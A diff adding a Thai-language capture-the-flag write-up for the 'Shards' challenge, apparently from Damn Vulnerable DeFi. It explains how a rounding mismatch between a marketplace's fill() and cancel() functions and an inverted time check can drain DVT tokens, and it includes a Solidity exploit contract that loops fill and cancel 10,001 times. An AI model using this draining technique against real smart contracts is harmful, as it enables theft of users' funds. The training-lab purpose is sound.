@@ -465,3 +465,31 @@ by tinamints
     }
 }`
 
+## 16. Shards
+### เงื่อนไข :
+- ดึง DVT ออกจาก marketplace แล้วส่งทั้งหมดไปยัง recovery
+- ยอดเงินใน staking contract ต้องไม่เปลี่ยน
+- ผู้เล่นส่งได้แค่ 1 transaction
+### คอนเซ็ป :
+-  rounding error (ปัดลง vs ปัดขึ้น)
+-  สูตรจ่ายเงินกับสูตรคืนเงินไม่ตรงกัน
+-  การเช็คเวลาที่เขียนผิด
+### วิธีแก้ :
+- `fill()` คิดเงินด้วยสูตร `want * _toDVT(price, rate) / totalShards` แบบปัดทศนิยมลง ทำให้ซื้อ 100 shards แล้วจ่าย 0 DVT (100 * 75e21 / 1e25 = 0.75 → 0) แต่ `cancel()` คืนเงินด้วยอีกสูตรคือ `shards * rate / 1e6` แบบปัดขึ้น ทำให้ได้ DVT คืนมาประมาณ 7.5e12 wei ต่อ 100 shards และการเช็คเวลาใน `cancel()` เขียนกลับด้าน เลยยกเลิกได้ทันทีใน block เดียวกับที่ซื้อ จึงวน fill → cancel 10001 รอบใน exploit contract (เพื่อให้จบใน 1 transaction) แล้วส่งกำไรไปที่ recovery
+### POC
+` function test_shards() public checkSolvedByPlayer {
+         Exploit exploit = new Exploit(marketplace,token,recovery);
+        exploit.attack(1);
+    }`
+
+`contract Exploit {
+    function attack(uint64 offerId) external {
+        uint256 wantShards = 100;
+        for (uint256 i = 0; i < 10001; i++) {
+            marketplace.fill(offerId, wantShards);
+            marketplace.cancel(1,i);
+        }
+        token.transfer(recovery,token.balanceOf(address(this)));
+    }
+}`
+
